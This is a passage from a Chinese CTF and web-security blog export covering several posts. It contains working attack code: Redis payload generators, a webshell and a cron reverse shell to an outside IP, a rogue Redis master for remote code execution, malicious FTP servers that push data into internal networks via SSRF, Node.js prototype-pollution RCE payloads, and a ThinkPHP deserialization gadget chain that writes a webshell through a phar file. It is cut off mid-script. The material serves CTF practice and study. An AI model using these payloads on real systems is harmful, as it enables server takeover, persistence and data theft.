加载扩展加载扩展很简单，用PHP_VALUE环境变量改配置就可以了，如下: 1&#x27;PHP_VALUE&#x27;: &#x27;open_basedir = /\\nextension_dir = /tmp\\nextension = npc4t.so&#x27; 通过控制php扩展加载路径和扩展名，加载我们上传到/tmp目录下的恶意扩展 后面直接执行扩展中的恶意函数即可反弹shell，成功绕过disable_functions 2.攻击redispayload生成redis服务也有自己的协议,协议比较简单，所以打redis的话生成payload就很简单了,下面脚本可以生成payload 1234567891011121314151617#redis客户端模拟 (RESPdef redis_cli(commands): if isinstance(commands,list): ret = &quot;&quot; for cmd in commands: ret += redis_cli(cmd) else: ret = &quot;&quot; cmd_arr = commands.split(&quot; &quot;) count = len(cmd_arr) ret += &quot;*&#123;&#125;\\r\\n&quot;.format(str(count)) for cmd in cmd_arr: ret += &quot;$&#123;&#125;\\r\\n&quot;.format(str(len(cmd))) ret += &quot;&#123;&#125;\\r\\n&quot;.format(cmd) return retprint(redis_cli([&quot;auth you_cannot_guess_it&quot;,&quot;module load /tmp/exp.so&quot;,&#x27;system.exec /bin/bash$&#123;IFS&#125;-c$&#123;IFS&#125;whoami$&#123;IFS&#125;&gt;/tmp/whoami.txt&#x27;])) redis的命令可以参考https://redis.io/commands 攻击redis可以根据权限大小来决定攻击方式 写webshell有写web目录权限的时候，可以直接写webshell，将db文件保存到web目录即可，用redis命令表示如下： 1234config set dir &#x2F;var&#x2F;www&#x2F;html &#x2F;&#x2F;设置dir的目录set shell &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; &#x2F;&#x2F;待会保存到db文件config set dbfilename webshell.php &#x2F;&#x2F;设置数据文件为webshell.phpsave &#x2F;&#x2F;保存 写crontab写定时任务的话有限制，因为redis的db文件前面是有乱码的，直接作为定时任务文件保存，有些系统不支持解析（貌似就centos可行，所以限制很大，鸡肋 1234config set dir &#x2F;var&#x2F;spool&#x2F;cron &#x2F;&#x2F;设置到定时任务目录config set dbfilename root &#x2F;&#x2F;生成一个root文件set payload &quot;\\n\\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.37.10.255&#x2F;1111 0&gt;&amp;1\\n\\n&quot; &#x2F;&#x2F;设置反弹shellsave &#x2F;&#x2F;保存 除此之外，还有利用主从模式RCE的，这种方式不需要有很大的权限 主从模式RCE写webshell和写crontab都需要很大的权限，利用主从模式,所需的权限就不必要那么大 原理是我们伪造redis服务端，作为主机，受害者redis服务作为从机，然后利用主从复制的原理，从机（受害）会复制主机的db数据存到dbfilename文件，这个过程是主机使用命令FULLRESYNC同步文件到从机，我们完全可以实现一个类似于文件上传的功能，构造任意文件传到从机 这个文件可以是恶意扩展exp.so，然后就可以加载扩展执行命令了 我用网上现有的redis攻击脚本扒了个服务端（x 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990# coding:utf-8import socketimport sysimport reCLRF = &quot;\\r\\n&quot;def din(sock, cnt): msg = sock.recv(cnt) if len(msg) &lt; 300: print(&quot;\\033[1;34;40m[-&gt;]\\033[0m &#123;&#125;&quot;.format(msg)) else: print(&quot;\\033[1;34;40m[-&gt;]\\033[0m &#123;&#125;......&#123;&#125;&quot;.format(msg[:80], msg[-80:])) if sys.version_info &lt; (3, 0): res = re.sub(r&#x27;[^\\x00-\\x7f]&#x27;, r&#x27;&#x27;, msg) else: res = re.sub(b&#x27;[^\\x00-\\x7f]&#x27;, b&#x27;&#x27;, msg) return res.decode()def dout(sock, msg): if type(msg) != bytes: msg = msg.encode() sock.send(msg) if sys.version_info &lt; (3, 0): msg = repr(msg) if len(msg) &lt; 300: print(&quot;\\033[1;32;40m[&lt;-]\\033[0m &#123;&#125;&quot;.format(msg)) else: print(&quot;\\033[1;32;40m[&lt;-]\\033[0m &#123;&#125;......&#123;&#125;&quot;.format(msg[:80], msg[-80:]))class RogueServer: def __init__(self, lhost, lport, payload): self._host = lhost self._port = lport self._payload = payload self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self._sock.bind((&#x27;0.0.0.0&#x27;, self._port)) self._sock.settimeout(15) self._sock.listen(10) def handle(self, data): resp = &quot;&quot; phase = 0 if data.find(&quot;PING&quot;) &gt; -1: resp = &quot;+PONG&quot; + CLRF phase = 1 elif data.find(&quot;REPLCONF&quot;) &gt; -1: resp = &quot;+OK&quot; + CLRF phase = 2 elif data.find(&quot;PSYNC&quot;) &gt; -1 or data.find(&quot;SYNC&quot;) &gt; -1: resp = &quot;+FULLRESYNC &quot; + &quot;Z&quot; * 40 + &quot; 0&quot; + CLRF resp += &quot;$&quot; + str(len(self._payload)) + CLRF resp = resp.encode() resp += self._payload + CLRF.encode() phase = 3 return resp, phase def close(self): self._sock.close() def exp(self): try: cli, addr = self._sock.accept() print(&quot;\\033[92m[+]\\033[0m Accepted connection from &#123;&#125;:&#123;&#125;&quot;.format(addr[0], addr[1])) while True: data = din(cli, 1024) if len(data) == 0: break resp, phase = self.handle(data) dout(cli, resp) if phase == 3: break except Exception as e: print(&quot;\\033[1;31;m[-]\\033[0m Error: &#123;&#125;, exit&quot;.format(e)) exit(0) except KeyboardInterrupt: print(&quot;[-] Exit..&quot;) exit(0)def main(): lhost = &#x27;x.x.x.x&#x27; lport = 1024 filename = &#x27;./exp.so&#x27; payload = open(filename, &quot;rb&quot;).read() rogue = RogueServer(lhost, lport, payload) #初始化socket rogue.exp() #开始监听连接，收到连接直接发送payload，即exp.so的内容，同步到从机if __name__ == &#x27;__main__&#x27;: main() 运行这个脚本，就可以在本地起一个redis服务，只要其他redis服务器使用slaveof命令将此恶意服务设为主机，就会发送FULLRESYNC命令将payload内容作为数据库同步数据发送到从机，从机上的dbfilename指定的文件内容会变成payload(同步)，一个完美的文件上传功能（bushi 上传exp.so仅需要让受攻击的redis服务作为从机连接我们的“主机” 关于exp.so的编写，参考https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 结合SSRF攻击，生成payload的脚本上面已经给出，需要让受害redis服务执行的命令为 12345678910config set dir .&#x2F;config set dbfilename exp.soslaveof 127.0.0.1 1024 &#x2F;&#x2F;这里开启主从模式，开启后就会复制内容module load .&#x2F;exp.soslaveof no one &#x2F;&#x2F;关闭复制system.exec &#39;whoami&#39; &#x2F;&#x2F;执行命令config set dbfilename dump.rdbsystem.exec &#39;rm .&#x2F;exp.so&#39;module unload system 最后记得擦一下屁股（x","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"disable_functions绕过","slug":"disable-functions绕过","permalink":"https://123-prog.github.io/tags/disable-functions%E7%BB%95%E8%BF%87/"}]},{"title":"CTF中ftp协议的利用","slug":"CTF中ftp协议的利用","date":"2021-10-04T09:54:12.000Z","updated":"2021-10-07T15:24:53.043Z","comments":true,"path":"2021/10/04/CTF中ftp协议的利用/","link":"","permalink":"https://123-prog.github.io/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/","excerpt":"ftp协议简单介绍","text":"ftp协议简单介绍 跟http协议一样，它也是一个文本协议，用于在客户端和服务端之间传输数据，它拥有自己的控制命令，客户端发送指定命令到服务端，服务端返回相应的状态码和信息； ftp默认端口两个，20和21，其中20用于传输数据，21用于传输控制信息； 看一个例子 这是我用vsftpd服务抓的一个包，可以看到ftp服务端和客户端之间的交互就是简单的文本命令 各种命令和状态码代表的意义参考https://www.iteye.com/blog/justcoding-835002 ftp的被动模式CTF中最多利用的就是ftp的被动模式，ftp传输数据的方式分为主动模式port和被动模式pasv，主动和被动的对象是服务端，主动即传输数据时，服务端主动去连接客户端的某个端口，用创建的这个连接来传输数据，被动模式即服务端给客户端提供一个端口，让客户端发起连接，这个过程，服务端处于被动连接状态，所以叫被动模式 被动模式的利用很简单，被动模式的服务端不仅可以指定客户端连接的端口，还可以指定客户端连接的地址，如果我们将这个地址指定为127.0.0.1，即客户端本地，客户端就会将数据送至本地某个端口，即可成功将数据送进内网，攻击内网中其他应用 应用CTF中，常见的就是在vps上搭恶意ftp服务器，用于转发数据进内网完成攻击 简单实现ftp服务器 12345678910111213141516171819202122232425262728import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建tcp sockets.bind((&#x27;0.0.0.0&#x27;,23)) s.listen(1) conn, addr = s.accept()conn.send(b&#x27;220 \\n&#x27;)print(conn.recv(20))conn.send(b&#x27;230 Login successful.\\n&#x27;)print(conn.recv(20))conn.send(b&#x27;200 \\n&#x27;)print(conn.recv(20))#SIZE /aaa\\r\\nconn.send(b&#x27;550 Could not get the file size.\\n&#x27;)print(conn.recv(20))#EPSV\\r\\nconn.send(b&#x27;200 \\n&#x27;)print(conn.recv(20)) #PASV\\r\\nconn.send(b&#x27;227 127,0,0,1,0,9001\\n&#x27;) #0*256+9001print(conn.recv(20))conn.send(b&#x27;150 Permission denied.\\n&#x27;)conn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() 除此之外，还有一种情况，实例代码 123&lt;?php$data = file_get_contents($_POST[&#x27;url&#x27;]);file_put_contents($_POST[&#x27;url&#x27;],$data); 利用方式有一点差别，同样利用ftp协议，第一次连接我们需要将payload发送给$data，第二次连接同上被动模式，将$data送到指定服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建tcp sockets.bind((&#x27;0.0.0.0&#x27;,2000))s.listen(1)so = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #用于传输数据so.bind((&#x27;0.0.0.0&#x27;,2001))so.listen(1)counts = 1payload = b&#x27;xxx&#x27;while 1: if counts == 1: conn, addr = s.accept() conn.send(b&#x27;200 \\n&#x27;) print(conn.recv(20)) #b&#x27;USER anonymous\\r\\n&#x27;n conn.send(b&#x27;230 login successful.\\n&#x27;) print(conn.recv(20)) #b&#x27;TYPE I\\r\\n&#x27; conn.send(b&#x27;200 \\n&#x27;) print(conn.recv(20)) #b&#x27;SIZE /aaa\\r\\n&#x27; conn.send(b&#x27;213 \\n&#x27;) print(conn.recv(20)) #b&#x27;EPSV\\r\\n&#x27; conn.send(b&#x27;200 \\n&#x27;) #不返回229就行，接下来就可以进入被动模式 print(conn.recv(20)) #b&#x27;PASV\\r\\n&#x27; conn.send(b&#x27;227 127,0,0,1,0,2001\\n&#x27;) print(conn.recv(20)) conn.send(b&#x27;150 \\n&#x27;) #告诉客户端数据连接已经准备好了，可以开始传输 conn2,addr2 = so.accept() #新建连接，传输数据 conn2.send(payload) #这里发送payload conn2.close() conn.send(b&#x27;226 \\n&#x27;) #告诉客户端数据已经传输完成 print(conn.recv(20)) conn.send(b&#x27;221 Goodbye.\\n&#x27;) conn.close() else: conn, addr = s.accept() conn.send(b&#x27;220 \\n&#x27;) print(conn.recv(20)) conn.send(b&#x27;230 Login successful.\\n&#x27;) print(conn.recv(20)) conn.send(b&#x27;200 \\n&#x27;) print(conn.recv(20)) #SIZE /aaa\\r\\n conn.send(b&#x27;550 Could not get the file size.\\n&#x27;) print(conn.recv(20)) #EPSV\\r\\n conn.send(b&#x27;200 \\n&#x27;) print(conn.recv(20)) #PASV\\r\\n conn.send(b&#x27;227 127,0,0,1,0,9001\\n&#x27;) print(conn.recv(20)) conn.send(b&#x27;150 Permission denied.\\n&#x27;) conn.send(b&#x27;221 Goodbye.\\n&#x27;) conn.close() counts += 1 有时候可能靶机没有出网，就连接不了我们构造的恶意ftp服务，但如果能拿到webshell的话，例如php的shell，我们依旧可以利用shell在靶机本地起我们的恶意ftp服务，附上ftp服务器php版本 12345678910111213141516171819202122232425&lt;?php$socket = stream_socket_server(&quot;tcp://0.0.0.0:2000&quot;,$errno,$err);if(!$socket)&#123; echo $errno.&#x27; &#x27;.$err.&#x27;\\n&#x27;;&#125;else&#123; while($conn = stream_socket_accept($socket))&#123; fwrite($conn,&quot;220 \\n&quot;); echo fgets($conn); fwrite($conn,&quot;230 Login successful.\\n&quot;); echo fgets($conn); fwrite($conn,&quot;200 \\n&quot;); echo fgets($conn); fwrite($conn,&quot;550 Could not get the file size.\\n&quot;); echo fgets($conn); fwrite($conn,&quot;200 \\n&quot;); echo fgets($conn); fwrite($conn,&quot;227 127,0,0,1,0,9000\\n&quot;); echo fgets($conn); fwrite($conn,&quot;150 Permission denied.\\n&quot;); fwrite($conn,&quot;221 Goodbye.\\n&quot;); fclose($conn); &#125; fclose($socket);&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"other","slug":"CTF/other","permalink":"https://123-prog.github.io/categories/CTF/other/"}],"tags":[{"name":"ftp协议","slug":"ftp协议","permalink":"https://123-prog.github.io/tags/ftp%E5%8D%8F%E8%AE%AE/"}]},{"title":"nodejs原型链污染","slug":"nodejs原型链污染","date":"2021-10-03T02:29:52.000Z","updated":"2021-10-03T14:50:37.257Z","comments":true,"path":"2021/10/03/nodejs原型链污染/","link":"","permalink":"https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"触发污染点0x01 lodash.defaultsDeep方法造成的原型链污染","text":"触发污染点0x01 lodash.defaultsDeep方法造成的原型链污染 影响lodash&lt;4.17.12所有版本，4.17.12之后修复，除了原本过滤的__proto__，新增过滤了constructor以防止污染全局对象 123456var merge = require(&#x27;lodash&#x27;).defaultsDeep;var payload = &#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;hack&quot;:&quot;whoami&quot;&#125;&#125;&#125;&#x27;;merge(&#123;&#125;,JSON.parse(payload));console.log(&#x27;sss&#x27;); 0x02 lodash.merge，lodash.mergeWithlodash&lt;4.17.5 12345var lodash= require(&#x27;lodash&#x27;);var payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;;lodash.merge(&#123;&#125;,JSON.parse(payload));console.log(1); 0x03 lodash.set ，lodash.setWith1set(object, path, value) 用于设置值到对象对于的属性路径上 123456789var object = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;_.set(object, &#x27;a[0].b.c&#x27;, 4);console.log(object.a[0].b.c);// =&gt; 4_.set(object, &#x27;x[0].y.z&#x27;, 5);console.log(object.x[0].y.z);// =&gt; 5 如果没有对传入的参数进行过滤，则可能造成原型链污染 例如 1234567var lodash = require(&#x27;lodash&#x27;);var object = &#123;&#x27;a&#x27;:[&#123;&#x27;b&#x27;:&#123;&#x27;c&#x27;:3&#125;&#125;]&#125;;lodash.set(object,&#x27;__proto__.hack&#x27;,&#x27;xxx&#x27;);console.log(1); 0x04 Undefsafe模块原型链污染用于处理访问对象属性不存在的报错问题，在版本小于2.0.3中存在原型链污染漏洞 123456789var undef = require(&#x27;undefsafe&#x27;);var object=&#123;&#125;console.log(undef(object,&#x27;c&#x27;));//undefine,c属性不存在undef(object,&#x27;c&#x27;,1);console.log(object)//覆盖类属性值，存在的话，修改，不存在，创建，这里创建了一个属性c，可以利用这一点污染原型链 123456var undef = require(&#x27;undefsafe&#x27;);var object=&#123;&#125;undef(object,&#x27;__proto__.hack&#x27;,&#x27;xxx&#x27;);console.log(1); RCE0x01 污染ejs实现rce利用点： 可以看到opts.outputFunctionName此时是undefined，利用原型链污染这个变量，可实现代码注入 例如构造代码 1a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;);// 便可以实现rce 简单merge操作的污染payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;);//&quot;&#125;&#125; 0x02 利用lodash.template实现RCE 污染options.sourceURL即可注入代码 1var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;; payload 1&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\nreturn global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)//&quot;&#125;&#125; 拿到flag自动删除污染的sourceURL 1&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\\n//&quot;&#125;&#125;","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"原型链污染","slug":"原型链污染","permalink":"https://123-prog.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"gadgetchains","slug":"gadgetchains","date":"2021-09-26T09:23:46.000Z","updated":"2021-10-03T14:46:21.801Z","comments":true,"path":"2021/09/26/gadgetchains/","link":"","permalink":"https://123-prog.github.io/2021/09/26/gadgetchains/","excerpt":"0x01 thinkphp 5.0.4~5.0.24","text":"0x01 thinkphp 5.0.4~5.0.24 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpnamespace think&#123; use think\\session\\driver\\Memcache; class Process&#123; private $status = &#x27;&#x27;; private $processPipes; private $processInformation; public function __construct()&#123; $this-&gt;processInformation[&#x27;running&#x27;] = true; $this-&gt;status = &#x27;starte&#x27;; //started,不同就行 $this-&gt;processPipes = new Memcache(); &#125; &#125;&#125;namespace think\\session\\driver&#123; use think\\model\\relation\\HasMany; class Memcache&#123; protected $handler = null; public function __construct()&#123; $this-&gt;handler = new HasMany(); //close() &#125; &#125;&#125;namespace think&#123; class Model&#123; &#125;&#125;namespace think\\model&#123; //为了满足跳板的条件而构建 use think\\Model; class Merge extends Model&#123; public $a = &#x27;1&#x27;; public function __construct()&#123; &#125; &#125;&#125;namespace think\\model&#123; class Relation&#123;&#125;&#125;namespace think\\db&#123; class Query&#123;&#125;&#125;namespace think\\model\\relation&#123; use think\\console\\Output; use think\\db\\Query; use think\\model\\Merge; use think\\model\\Relation; class HasMany extends Relation&#123; protected $parent; protected $localKey=&#x27;a&#x27;; protected $foreignKey=&#x27;a&#x27;; protected $pivot; public function __construct() &#123; $this-&gt;query = new Output(); $this-&gt;parent = new Merge(); &#125; &#125;&#125;namespace think\\console&#123; use think\\session\\driver\\Memcached; class Output&#123; //找到链入口，_call private $handle; protected $styles; protected $config; function __construct() &#123; $this-&gt;styles = [&#x27;where&#x27;]; $this-&gt;handle = new Memcached(); //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver&#123; use think\\cache\\driver\\File; class Memcached&#123; protected $handler; function __construct() &#123; $this-&gt;handler = new File(); //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver&#123; class File&#123; protected $options = null; protected $tag; public function __construct()&#123; $this-&gt;options[&#x27;expire&#x27;] = &#x27;3306&#x27;; $this-&gt;options[&#x27;cache_subdir&#x27;] = false; $this-&gt;options[&#x27;prefix&#x27;] = false; #$this-&gt;options[&#x27;path&#x27;] = &#x27;uploads/aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/&#x27;; $this-&gt;options[&#x27;path&#x27;] = &#x27;php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/resource=/var/www/html/public/aPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../uploads/&#x27;; $this-&gt;options[&#x27;data_compress&#x27;] = false; $this-&gt;tag = &#x27;xxx&#x27;; &#125; &#125;&#125;namespace&#123; $data = new think\\Process(); echo urlencode(serialize($data)); @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $phar-&gt;setMetadata($data); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); rename(&#x27;phar.phar&#x27;,&#x27;phar.gif&#x27;);&#125; 12345任意写文件:1.File类的变量$this-&gt;options[&#39;path&#39;]控制写入文件的目录，目录中有一部分是shell(post ccc)，后面会被写到文件中注：路径最好是绝对路径，对于php析构函数来说，有时候工作目录会与正常不同，例如apache服务器，php析构函数的工作目录在根目录2.生成shell的文件名构成为 md5(&#39;tag_&#39; . md5($this-&gt;tag)),按照上面给出的tag，生成的shell文件名应该是12ac95f1498ce51d2d96a249c09c1998.php 0x02 待续。。。","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"php反序列化","slug":"php反序列化","permalink":"https://123-prog.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"(RCTF2021)ns_shaft_sql","slug":"RCTF2021-ns-shaft-sql","date":"2021-09-18T08:51:11.000Z","updated":"2021-09-22T10:21:48.644Z","comments":true,"path":"2021/09/18/RCTF2021-ns-shaft-sql/","link":"","permalink":"https://123-prog.github.io/2021/09/18/RCTF2021-ns-shaft-sql/","excerpt":"0x01 源码","text":"0x01 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);session_start();include_once &quot;config.php&quot;;include_once &quot;flag.php&quot;;function init_status() &#123; if (!isset($_SESSION[&#x27;floor&#x27;])) &#123; $_SESSION[&#x27;floor&#x27;] = 1; &#125; if (!isset($_SESSION[&#x27;disabled_functions&#x27;])) &#123; $_SESSION[&#x27;disabled_functions&#x27;] = array(); &#125; if (!isset($_SESSION[&#x27;k&#x27;])) &#123; $_SESSION[&#x27;k&#x27;] = random_str(8); &#125;&#125;function reset_status() &#123; $_SESSION[&#x27;floor&#x27;] = 1; $_SESSION[&#x27;disabled_functions&#x27;] = array(); $_SESSION[&#x27;k&#x27;] = random_str(8);&#125;function random_str($length=0) &#123; $ss = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; if ($length == 0) &#123; $length = mt_rand(10, 20); &#125; $res = &quot;&quot;; for($i=0; $i&lt;$length; $i++) &#123; $res .= $ss[mt_rand(0, 61)]; &#125; return $res;&#125;function random_str2() &#123; $ss = &quot;0123456789&quot;; $length = mt_rand(10, 17); $res = &quot;&quot;; $res .= $ss[mt_rand(1, 9)]; for($i=0; $i&lt;$length; $i++) &#123; $res .= $ss[mt_rand(0, 9)]; &#125; return $res;&#125;function extract_function($query, $err_msg, $err_code, $sqlstate) &#123; global $mysql_functions; $allowed_functions = array(&quot;concat&quot;, &quot;unhex&quot;); $funcs = array(); $query_arr = preg_split(&quot;/[^a-zA-Z0-9_]/&quot;, strtolower($query)); foreach($mysql_functions as $func) &#123; $func = strtolower($func); if(!in_array($func, $allowed_functions) &amp;&amp; in_array($func, $query_arr)) &#123; array_push($funcs, $func); &#125; &#125; return $funcs;&#125;init_status();$max_floor = 0x2e;if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); exit(0);&#125;if (isset($_GET[&#x27;reset&#x27;])) &#123; reset_status(); printf(&quot;Reset successfully!&quot;); exit(0);&#125;printf(&quot;You are on floor %d.\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;floor&#x27;]);printf(&quot;Your key is %s\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;k&#x27;]);printf(&quot;Disabled Functions: %s\\n&lt;br&gt;\\n&quot;, implode(&quot;, &quot;, $_SESSION[&#x27;disabled_functions&#x27;]));if (!isset($_REQUEST[&#x27;sql&#x27;])) &#123; highlight_file(__FILE__); exit(0);&#125;$query = base64_decode($_REQUEST[&#x27;sql&#x27;]);if (empty($query) || strlen($query) &gt; 0x100 || !ctype_print($query)) &#123; die(&quot;Die&quot;);&#125;$disabled_functions = $_SESSION[&#x27;disabled_functions&#x27;];foreach ($disabled_functions as $func) &#123; if (stripos($query, $func) !== false) &#123; die(&quot;Die&quot;); &#125;&#125;$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);$k = $_SESSION[&#x27;k&#x27;];$v = random_str2();if (!$mysqli-&gt;query(&quot;DELETE FROM `s` WHERE k=&#x27;$k&#x27;;&quot;)) &#123; die(&quot;Die&quot;);&#125;if (!$mysqli-&gt;query(&quot;INSERT INTO `s` (`k`, `v`) values (&#x27;$k&#x27;, &#x27;$v&#x27;);&quot;)) &#123; die(&quot;Die&quot;);&#125;if ($mysqli-&gt;query($query) === false) &#123; $err_msg = mysqli_error($mysqli); if (!empty($err_msg) &amp;&amp; (strpos($err_msg, $v) !== false)) &#123; $funcs = extract_function($query, $err_msg, $err_code, $sqlstate); if (empty($funcs)) &#123; die(&quot;Die&quot;); &#125; foreach($funcs as $func) &#123; if (in_array($func, $disabled_functions)) &#123; die(&quot;Die&quot;); &#125; &#125; $_SESSION[&#x27;floor&#x27;] += 1; $_SESSION[&#x27;disabled_functions&#x27;] = array_merge($_SESSION[&#x27;disabled_functions&#x27;], $funcs); if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); &#125; else &#123; printf(&quot;Success! You are on floor %d, and your key is %s.\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;floor&#x27;], $_SESSION[&#x27;k&#x27;]); printf(&quot;Disabled Functions: %s\\n&lt;br&gt;\\n&quot;, implode(&quot;, &quot;, $_SESSION[&#x27;disabled_functions&#x27;])); &#125; exit(0); &#125;&#125;die(&quot;Die&quot;);?&gt; 简单审计一下 获取flag的条件 12345$max_floor = 0x2e;if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); exit(0);&#125; $_SESSION[&#39;floor&#39;]增加的条件 123456789101112131415161718192021222324if ($mysqli-&gt;query($query) === false) &#123; $err_msg = mysqli_error($mysqli); if (!empty($err_msg) &amp;&amp; (strpos($err_msg, $v) !== false)) &#123; $funcs = extract_function($query, $err_msg, $err_code, $sqlstate); if (empty($funcs)) &#123; die(&quot;Die&quot;); &#125; foreach($funcs as $func) &#123; if (in_array($func, $disabled_functions)) &#123; die(&quot;Die&quot;); &#125; &#125; $_SESSION[&#x27;floor&#x27;] += 1; $_SESSION[&#x27;disabled_functions&#x27;] = array_merge($_SESSION[&#x27;disabled_functions&#x27;], $funcs); if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); &#125; else &#123; printf(&quot;Success! You are on floor %d, and your key is %s.\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;floor&#x27;], $_SESSION[&#x27;k&#x27;]); printf(&quot;Disabled Functions: %s\\n&lt;br&gt;\\n&quot;, implode(&quot;, &quot;, $_SESSION[&#x27;disabled_functions&#x27;])); &#125; exit(0); &#125;&#125; 满足以下条件： 1.传入的query查询报错，返回false 2.报错信息中包含变量$v，随机的字符串，每次请求都会重新生成，并存放在数据库中 3.extract_function()函数返回值不为空 extract_function()函数大致功能是判断我们query是否使用了全局数组$mysql_functions，这个数组里面是mysql的一些函数 12345678910111213function extract_function($query, $err_msg, $err_code, $sqlstate) &#123; global $mysql_functions; $allowed_functions = array(&quot;concat&quot;, &quot;unhex&quot;); $funcs = array(); $query_arr = preg_split(&quot;/[^a-zA-Z0-9_]/&quot;, strtolower($query)); foreach($mysql_functions as $func) &#123; $func = strtolower($func); if(!in_array($func, $allowed_functions) &amp;&amp; in_array($func, $query_arr)) &#123; array_push($funcs, $func); &#125; &#125; return $funcs;&#125; 满足条件的payload首先语句报错且报错信息中会出现变量$v 1set @@sql_mode:&#x3D;(select v from s where k&#x3D;$k); 执行如上语句，会出现报错信息，满足第一个条件 1&#39;sql_mode&#39; can&#39;t be set to the value of &#39;796016918671763&#39; 查询语句还需要出现数组$mysql_functions中的函数，直接在后面添加注释 1set @@sql_mode:&#x3D;(select v from s where k&#x3D;$k)&#x2F;*$func*&#x2F;; NU1L的脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164#-*-coding=utf-8-*-import requestsimport base64s = requests.Session()url = &quot;http://124.71.132.232:23334/&quot;def execute(query): global s,url query = base64.b64encode(query.encode()) res = s.get(url+&quot;?sql=&quot;+query.decode()).text print(res) k = res.split(&quot;Your key is &quot;)[1].split(&#x27;\\n&#x27;)[0].strip() return kdef create_func(): c_query = &#x27;&#x27;&#x27;select 123;&#x27;&#x27;&#x27; print(c_query) return execute(c_query)k = create_func() #拿到初始keyl = 